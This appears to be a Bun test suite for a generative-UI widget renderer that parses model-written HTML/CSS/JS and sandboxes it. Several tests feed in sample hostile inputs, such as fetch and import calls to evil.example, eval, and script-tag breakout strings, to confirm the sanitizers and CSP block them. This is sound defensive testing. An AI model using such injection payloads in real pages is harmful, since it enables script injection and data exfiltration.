import { describe, expect, test } from "bun:test";
import { readFileSync } from "fs";
import path from "path";
import {
  parseGenerativeUiDsl,
  splitGenerativeUiSegments,
  withGenerativeUiSegmentIds,
  hasWidgetBody,
} from "../web/src/indirect-code/components/generative-ui/dsl";
import { processPartialHtml } from "../web/src/indirect-code/components/generative-ui/process-partial-html";
import {
  clampFrameHeight,
  MIN_FRAME_HEIGHT,
  MAX_FRAME_HEIGHT,
} from "../web/src/indirect-code/components/generative-ui/bridge";
import {
  WIDGET_BASE_CSS,
  escapeScriptClose,
  escapeStyleClose,
  sanitizeModelJS,
  widgetCSP,
  widgetNetCSP,
  buildRuntimeScript,
  buildModelScript,
  buildWidgetDocument,
  makeScriptNonce,
} from "../web/src/indirect-code/components/generative-ui/widget-doc";

describe("parseGenerativeUiDsl", () => {
  test("parses headers and sections", () => {
    const body = [
      "placeholder: Building your savings projection",
      "height: 360",
      `state: {"amount": 1000, "years": 5}`,
      "",
      "@html",
      '<div class="gu-root">hi</div>',
      "@css",
      ".gu-root { padding: 8px; }",
      "@js",
      "const el = document.getElementById('x');",
    ].join("\n");
    const d = parseGenerativeUiDsl(body);
    expect(d.placeholder).toBe("Building your savings projection");
    expect(d.height).toBe(360);
    expect(d.state).toEqual({ amount: 1000, years: 5 });
    expect(d.html).toBe('<div class="gu-root">hi</div>');
    expect(d.css).toBe(".gu-root { padding: 8px; }");
    expect(d.js).toBe("const el = document.getElementById('x');");
  });

  test("content before any section is html", () => {
    const d = parseGenerativeUiDsl("<div>direct</div>");
    expect(d.html).toBe("<div>direct</div>");
  });

  test("partial state JSON during streaming is dropped safely", () => {
    const d = parseGenerativeUiDsl('state: {"amount": 10');
    expect(d.state).toBeUndefined();
  });

  test("streams partial html (no closing fence yet)", () => {
    const d = parseGenerativeUiDsl("@html\n<div class=\"gu-root\"><h2 class=\"gu-ti");
    expect(d.html).toContain('<div class="gu-root">');
    expect(hasWidgetBody(d)).toBe(true);
  });

  test("accepts @javascript and @script aliases", () => {
    const d = parseGenerativeUiDsl("@javascript\nalert(1);");
    expect(d.js).toBe("alert(1);");
  });

  test("parses the net header", () => {
    expect(parseGenerativeUiDsl("net: true\n@html\n<div></div>").net).toBe(true);
    expect(parseGenerativeUiDsl("net: yes\n@html\n<div></div>").net).toBe(true);
    expect(parseGenerativeUiDsl("net: false\n@html\n<div></div>").net).toBe(false);
    expect(parseGenerativeUiDsl("@html\n<div></div>").net).toBeUndefined();
    expect(parseGenerativeUiDsl("libs: map\nnet: true\n@html\n<div></div>").libs).toEqual(["map"]);
  });

  test("parses the libs header (whitelist, dedupe, order)", () => {
    expect(parseGenerativeUiDsl("libs: d3, three\n@html\n<div></div>").libs)
      .toEqual(["d3", "three"]);
    expect(parseGenerativeUiDsl("libs: three d3 three\n@html\n<div></div>").libs)
      .toEqual(["three", "d3"]);
    expect(parseGenerativeUiDsl("libs: evil, d3\n@html\n<div></div>").libs)
      .toEqual(["d3"]);
    expect(parseGenerativeUiDsl("@html\n<div></div>").libs).toBeUndefined();
    expect(parseGenerativeUiDsl("libs: gsap, chart\n@html\n<div></div>").libs)
      .toEqual(["gsap", "chart"]);
  });

  test("unknown header keys are ignored as html content? no — key: value lines stay header-ish", () => {
    const d = parseGenerativeUiDsl("color: red\n@html\n<div></div>");
    // Unknown `key: value` before any section does not crash the parser.
    expect(d.html).toContain("<div></div>");
  });
});

describe("splitGenerativeUiSegments", () => {
  test("splits markdown and widget runs", () => {
    const text = [
      "Here is the answer:",
      "",
      "```generative_ui",
      "placeholder: My widget",
      "@html",
      "<div>x</div>",
      "```",
      "",
      "And the conclusion.",
    ].join("\n");
    const segs = splitGenerativeUiSegments(text);
    expect(segs.length).toBe(3);
    expect(segs[0].kind).toBe("md");
    expect(segs[1].kind).toBe("widget");
    expect(segs[1].kind === "widget" && segs[1].closed).toBe(true);
    expect(segs[1].kind === "widget" && segs[1].body).toContain("<div>x</div>");
    expect(segs[2].kind).toBe("md");
  });

  test("keeps other code fences inside markdown runs", () => {
    const text = "intro\n\n```js\nconst a = 1;\n```\n\noutro";
    const segs = splitGenerativeUiSegments(text);
    expect(segs.length).toBe(1);
    expect(segs[0].kind).toBe("md");
    expect(segs[0].kind === "md" && segs[0].text).toContain("```js");
  });

  test("open fence at stream end becomes an unclosed widget segment", () => {
    const text = "before\n\n```generative_ui\nplaceholder: Loading thing\n@html\n<div class=\"gu-ro";
    const segs = splitGenerativeUiSegments(text);
    const widget = segs.find((s) => s.kind === "widget");
    expect(widget).toBeTruthy();
    expect(widget!.kind === "widget" && widget!.closed).toBe(false);
    expect(widget!.kind === "widget" && widget!.body).toContain("@html");
  });

  test("genui alias works", () => {
    const segs = splitGenerativeUiSegments("```genui\n@html\n<div></div>\n```");
    expect(segs[0].kind).toBe("widget");
  });

  test("longer fence (4 ticks) closes correctly", () => {
    const segs = splitGenerativeUiSegments("````generative_ui\n@html\n<div></div>\n````\ndone");
    expect(segs[0].kind).toBe("widget");
    expect(segs[0].kind === "widget" && segs[0].closed).toBe(true);
    expect(segs[1].kind === "md" && segs[1].text).toBe("done");
  });
});

describe("processPartialHtml", () => {
  test("closes unclosed tags", () => {
    expect(processPartialHtml('<div class="a"><span>he')).toBe('<div class="a"><span>he</span></div>');
  });

  test("trims an incomplete trailing tag", () => {
    expect(processPartialHtml("<div>ok</div><sec")).toBe("<div>ok</div>");
    expect(processPartialHtml("<div>ok</div><section cla")).toBe("<div>ok</div>");
  });

  test("keeps void elements unclosed", () => {
    expect(processPartialHtml('<img src="x"><br>')).toBe('<img src="x"><br>');
  });

  test("nested tags close in reverse order", () => {
    expect(processPartialHtml("<ul><li><b>x")).toBe("<ul><li><b>x</b></li></ul>");
  });

  test("handles self-closing custom elements", () => {
    expect(processPartialHtml("<my-el /><div>")).toBe("<my-el /><div></div>");
  });
});

describe("bridge clamps", () => {
  test("clamps reported heights", () => {
    expect(clampFrameHeight(320)).toBe(320);
    expect(clampFrameHeight(0)).toBe(MIN_FRAME_HEIGHT);
    expect(clampFrameHeight(999999)).toBe(MAX_FRAME_HEIGHT);
    expect(clampFrameHeight(NaN)).toBe(MIN_FRAME_HEIGHT);
    expect(clampFrameHeight(-5)).toBe(MIN_FRAME_HEIGHT);
    expect(clampFrameHeight(120.7)).toBe(121);
  });
});

describe("widget document sanitizers", () => {
  test("escapeScriptClose neutralizes script closers in any shape", () => {
    expect(escapeScriptClose("</script>")).toBe("<\\/script>");
    expect(escapeScriptClose("x < / ScRiPt y")).not.toMatch(/<\s*\/?\s*script/i);
    expect(escapeScriptClose("<script>alert(1)</script>"))
      .not.toMatch(/<\s*\/?\s*script/i);
  });

  test("escapeStyleClose neutralizes style closers", () => {
    expect(escapeStyleClose(".a{}</style><script>x</script>"))
      .not.toMatch(/<\s*\/\s*style/i);
  });

  test("sanitizeModelJS strips forbidden capabilities", () => {
    const js = [
      "const x = 1;",
      "fetch('https://evil.example');",
      "location.href = 'https://evil.example';",
      "import { a } from 'b';",
      "eval('1+1');",
      "new Function('return 1');",
      "document.getElementById('a').textContent = 'ok';",
    ].join("\n");
    const clean = sanitizeModelJS(js);
    expect(clean).toContain("const x = 1;");
    expect(clean).toContain("textContent = 'ok'");
    for (const bad of ["fetch(", "location.href", "import {", "eval(", "new Function("]) {
      expect(clean).not.toContain(bad);
    }
  });

  test("sanitizeModelJS allows esm.sh dynamic imports only when opted in", () => {
    const esm = 'import("https://esm.sh/canvas-confetti@1").then((m) => m.default());';
    const other = 'import("https://evil.example/x.js").then(() => {});';
    const statik = 'import confetti from "https://esm.sh/canvas-confetti@1";';
    // Default (offline widget): every import form is stripped.
    expect(sanitizeModelJS(esm)).not.toContain("esm.sh");
    // Net widget: only the literal esm.sh dynamic import survives.
    const clean = sanitizeModelJS([esm, other, statik].join("\n"), { allowEsmSh: true });
    expect(clean).toContain(esm);
    expect(clean).not.toContain("evil.example");
    expect(clean).not.toContain("import confetti");
  });

  test("buildRuntimeScript wraps model js in a try/catch", () => {
    const script = buildRuntimeScript({ stateJSON: '{"a":1}' });
    expect(script).toContain("window.__gu");
    expect(script).toContain("$render");
    expect(script).toContain("$onDestroy");
    expect(script).toContain("pagehide");
  });

  test("buildModelScript splices the body and registers a destroy hook", () => {
    const script = buildModelScript("doStuff(); return { destroy() {} };");
    expect(script).toContain("doStuff(); return { destroy() {} };");
    expect(script).toContain("$onDestroy(__result.destroy)");
    expect(script).toContain("reportError");
    // No eval: the sandbox CSP has no 'unsafe-eval'.
    expect(script).not.toContain("eval(");
  });

  test("widget CSP is locked down: sandboxed, images-only network, nonce scripts", () => {
    const csp = widgetCSP("abc");
    expect(csp).toContain("sandbox allow-scripts");
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("script-src 'nonce-abc'");
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("frame-ancestors 'self'");
    // Images may load from any http(s) site; scripts stay strictly nonce'd.
    expect(csp).toContain("img-src data: blob: https: http:");
    expect(csp).not.toContain("esm.sh");
    const scriptSrc = csp.split(";").map((s) => s.trim()).find((s) => s.startsWith("script-src")) || "";
    expect(scriptSrc).not.toContain("unsafe-inline");
    expect(scriptSrc).not.toContain("unsafe-eval");
  });

  test("net widget CSP opens https data and esm.sh scripts only", () => {
    const csp = widgetNetCSP("abc");
    expect(csp).toContain("img-src data: blob: https: http:");
    expect(csp).toContain("connect-src https:");
    expect(csp).toContain("script-src 'nonce-abc' https://esm.sh");
    const scriptSrc = csp.split(";").map((s) => s.trim()).find((s) => s.startsWith("script-src")) || "";
    expect(scriptSrc).not.toContain("unsafe-inline");
    expect(scriptSrc).not.toContain("unsafe-eval");
  });

  test("buildWidgetDocument never lets model css/js break out of its element", () => {
    const doc = buildWidgetDocument({
      theme: "dark",
      html: "<div class=\"gu-root\">x</div>",
      css: ".a{}</style><script>window.evil=1</script><style>",
      stateJSON: "{}",
      js: "window.pwned=1;</script><script>window.pwned2=1",
      initialHeight: 320,
      scriptNonce: makeScriptNonce(),
    });
    // The only <script> elements outside <style> text are nonce'd
    // (runtime + model wrapper); model CSS text can mention <script> but is
    // trapped inside its style element.
    const outsideStyles = doc.replace(/<style>[\s\S]*?<\/style>/g, "");
    const scripts = outsideStyles.match(/<script\b/g) || [];
    const nonces = outsideStyles.match(/<script nonce=/g) || [];
    expect(scripts.length).toBe(nonces.length);
    // runtime + model script
    expect(scripts.length).toBe(2);
    expect(doc).not.toMatch(/<\/style><script>window\.evil/);
    expect(doc).not.toMatch(/<\/script><script>window\.pwned2/);
  });
});

describe("widget design system", () => {
  test("base CSS mirrors the host card surfaces in both themes", () => {
    // Light card / dark card from web/style.tailwindcss.css: the widget
    // surface is the host card color so the frame seam stays invisible.
    expect(WIDGET_BASE_CSS).toContain("--gu-bg: #fafbfc");
    expect(WIDGET_BASE_CSS).toContain("--gu-bg: #1b1e21");
    expect(WIDGET_BASE_CSS).toContain("--gu-elev: #24272b");
  });

  test("base CSS ships the curated chart palette and composed controls", () => {
    for (const token of ["--gu-chart-1", "--gu-chart-2", "--gu-chart-3", "--gu-chart-4", "--gu-chart-5"]) {
      expect(WIDGET_BASE_CSS).toContain(token);
    }
    for (const cls of [".gu-header", ".gu-segmented", ".gu-choice", ".gu-stage", ".gu-table-wrap", ".gu-card.is-selected"]) {
      expect(WIDGET_BASE_CSS).toContain(cls);
    }
    // Custom slider (thin track + thumb), not bare accent-color.
    expect(WIDGET_BASE_CSS).toContain("::-webkit-slider-thumb");
    expect(WIDGET_BASE_CSS).toContain("::-moz-range-thumb");
    // Tables never zebra-stripe.
    expect(WIDGET_BASE_CSS).toContain("tbody tr:nth-child(even) { background: transparent; }");
  });

  test("runtime auto-fits height and syncs slider fill", () => {
    const script = buildRuntimeScript({ stateJSON: "{}" });
    expect(script).toContain("ResizeObserver");
    expect(script).toContain("MutationObserver");
    expect(script).toContain('setProperty("--p"');
    // The mutation observer must never watch attributes: slider fill writes
    // (and per-frame animation styles) would self-trigger it into a loop.
    expect(script).not.toContain("attributeFilter");
    expect(script).not.toContain("attributes: true");
    // Uncaught widget errors are reported to the host error footer.
    expect(script).toContain("unhandledrejection");
    expect(script).toContain('addEventListener("error"');
  });
});

describe("streaming segment stability (no per-token remount)", () => {
  const FULL = [
    "Here is a savings calculator for you.",
    "",
    "```generative_ui",
    "placeholder: Building your savings projection",
    "@html",
    '<div class="gu-root"><h2 class="gu-title">Hi</h2></div>',
    "```",
    "",
    "Adjust the slider to explore.",
  ].join("\n");

  test("segment ids are stable while tokens append", () => {
    // Simulate token streaming over prefix slices. The reconciled store in
    // StreamingMarkdown keys by these ids; an id that changes for an
    // already-mounted segment remounts its TarnavMarkdown/widget instance.
    const seenKindById = new Map<string, "md" | "widget">();
    let previousIds: string[] = [];
    for (let n = 8; n <= FULL.length + 8; n += 8) {
      const segs = withGenerativeUiSegmentIds(
        splitGenerativeUiSegments(FULL.slice(0, Math.min(n, FULL.length))),
      );
      const ids = segs.map((s) => s.id);
      // Ids are unique within a step and never change kind once seen.
      expect(new Set(ids).size).toBe(ids.length);
      for (const seg of segs) {
        const before = seenKindById.get(seg.id);
        if (before !== undefined) expect(seg.kind).toBe(before);
        seenKindById.set(seg.id, seg.kind);
      }
      // Every id present in both steps survives in place (no churn).
      for (const id of previousIds) {
        if (seenKindById.has(id) && ids.includes(id)) {
          expect(ids.indexOf(id)).toBe(previousIds.indexOf(id));
        }
      }
      previousIds = ids;
    }
    expect(previousIds).toEqual(["s0:md", "s1:widget", "s2:md"]);
  });

  test("transcript markdown renders through a reconciled store, memoized parse", () => {
    const root = path.join(import.meta.dir, "..");
    const streaming = readFileSync(
      path.join(root, "web/src/indirect-code/components/StreamingMarkdown.tsx"),
      "utf8",
    );
    // Regression: <For each={segments()}> over freshly split objects
    // remounted the stateful TarnavMarkdown parser on every token.
    expect(streaming).toContain("createStore");
    expect(streaming).toContain("reconcile(");
    expect(streaming).not.toContain("each={segments()}");
    // Basic mode (thinking disclosures) never mounts widgets.
    expect(streaming).toContain("if (props.basic)");
    const renderer = readFileSync(
      path.join(root, "web/src/indirect-code/components/generative-ui/renderer.tsx"),
      "utf8",
    );
    expect(renderer).toContain("createMemo<GenerativeUiData>");
    expect(renderer).not.toContain("const data = (): GenerativeUiData =>");
    // Centered loading state + error footer that pastes a report (ref +
    // placeholder + message) into the composer without sending it.
    expect(renderer).toContain("place-items-center");
    expect(renderer).toContain("mb-3");
    expect(renderer).toContain("Ask to fix");
    expect(renderer).toContain("onPrefillPrompt");
    expect(streaming).toContain("onPrefillPrompt");
    const bridge = readFileSync(
      path.join(root, "web/src/indirect-code/components/generative-ui/bridge.ts"),
      "utf8",
    );
    expect(bridge).toContain('data.__gu !== "error"');
    expect(bridge).toContain("onError");
  });
});
